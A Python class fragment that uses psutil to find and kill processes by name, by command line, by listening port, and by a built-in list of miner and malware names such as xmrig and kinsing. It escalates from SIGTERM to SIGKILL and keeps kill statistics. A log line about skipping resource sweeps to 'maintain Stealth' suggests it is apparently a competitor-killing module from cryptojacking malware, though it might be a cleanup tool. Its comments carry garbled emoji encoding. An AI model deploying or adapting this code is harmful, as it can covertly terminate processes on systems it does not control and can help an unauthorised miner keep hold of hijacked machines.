    def _is_protected(self, proc):
        """
        âœ… FIXED: Check if process should be protected from killing
        
        Args:
            proc: psutil.Process object
            
        Returns:
            bool: True if process should be protected
        """
        try:
            pid = proc.pid
            
            # âœ… PROTECTION 1: Check protected PIDs FIRST (highest priority)
            if pid in self.protected_pids:
                logger.debug(f"ðŸ›¡ï¸  Protected PID: {pid} ({proc.name()})")
                return True
            
            # âœ… PROTECTION 2: Check own process
            if pid == os.getpid() or pid == os.getppid():
                logger.debug(f"ðŸ›¡ï¸  Own process: {pid}")
                return True
            
            # âœ… PROTECTION 3: Check callback function
            if self.protection_callback:
                try:
                    if self.protection_callback(proc):
                        logger.debug(f"ðŸ›¡ï¸  Protected by callback: {pid} ({proc.name()})")
                        return True
                except Exception as e:
                    logger.debug(f"Protection callback error for PID {pid}: {e}")
                    
        except Exception as e:
            logger.debug(f"Protection check error: {e}")
            
        return False
    
    def kill_by_process_name(self, target_names):
        killed = 0
        self.logger.info("Vector 1: Name-based process detection...")
        try:
            pids = psutil.pids()
        except Exception:
            return 0
            
        for pid in pids:
            if pid in self.protected_pids: continue
            try:
                p = psutil.Process(pid)
                name = p.name().lower()
                cmd = " ".join(p.cmdline() or []).lower()
                if any(t in name or t in cmd for t in target_names):
                    p.kill()
                    killed += 1
            except Exception:
                continue
        return killed
    
    def kill_by_resource_usage(self, *args, **kwargs):
        self.logger.info("Vector 2: Resource-based detection...")
        self.logger.info("ðŸ›¡ï¸ Skipping resource sweeps to preserve legitimate host ML workloads and maintain Stealth.")
        return 0
    
    def kill_by_connections(self, target_ports):
        killed = 0
        self.logger.info(f"Vector 3: Network-based detection (ports {target_ports})...")
        try:
            pids = psutil.pids()
        except Exception:
            return 0
            
        for pid in pids:
            if pid in self.protected_pids: continue
            try:
                p = psutil.Process(pid)
                for conn in p.connections(kind='inet'):
                    if conn.laddr and conn.laddr.port in target_ports:
                        p.kill()
                        killed += 1
                        break
            except Exception:
                continue
        return killed
    
    def kill_by_behavioral_analysis(self):
        killed = 0
        self.logger.info("Vector 4: Behavioral-based detection...")
        try:
            pids = psutil.pids()
        except Exception:
            return 0
            
        for pid in pids:
            if pid in self.protected_pids: continue
            try:
                p = psutil.Process(pid)
                name = p.name().lower()
                # Behavioral heuristic: Miner-like naming conventions
                if any(x in name for x in ['miner', 'cpuminer', 'xmrig', 'nanominer', 'kinsing', 'kdevtmp']):
                    p.kill()
                    killed += 1
            except Exception:
                continue
        return killed
    
    def _kill_process(self, pid):
        """
        Kill a process with escalation (SIGTERM â†’ SIGKILL)
        
        Args:
            pid: Process ID to kill
            
        Returns:
            bool: True if process was killed
        """
        # âœ… FINAL SAFETY CHECK: Never kill protected PIDs
        if pid in self.protected_pids:
            logger.debug(f"ðŸ›¡ï¸  Blocked kill attempt on protected PID {pid}")
            return False
        
        # Skip invalid PIDs or already killed
        if pid <= 1 or pid in self.killed_pids:
            return False
        
        # Don't kill our own process
        if pid == os.getpid() or pid == os.getppid():
            return False
        
        try:
            # SIGTERM first (graceful)
            os.kill(pid, signal.SIGTERM)
            time.sleep(0.1)
            
            # Verify death, SIGKILL if needed
            try:
                os.getpgid(pid)
                # Still alive, force kill
                os.kill(pid, signal.SIGKILL)
                time.sleep(0.05)
            except ProcessLookupError:
                pass  # Process already dead
            
            self.killed_pids.add(pid)
            logger.debug(f"âœ“ Killed PID {pid}")
            return True
            
        except ProcessLookupError:
            # Process doesn't exist
            return False
        except PermissionError:
            logger.debug(f"âœ— Permission denied to kill PID {pid}")
            return False
        except Exception as e:
            logger.debug(f"âœ— Error killing PID {pid}: {e}")
            return False
    
    def get_stats(self):
        """Get elimination statistics"""
        return {
            'total_killed': len(self.killed_pids),
            'detection_breakdown': self.detection_stats.copy(),
            'killed_pids': list(self.killed_pids),
            'protected_pids': list(self.protected_pids)
        }

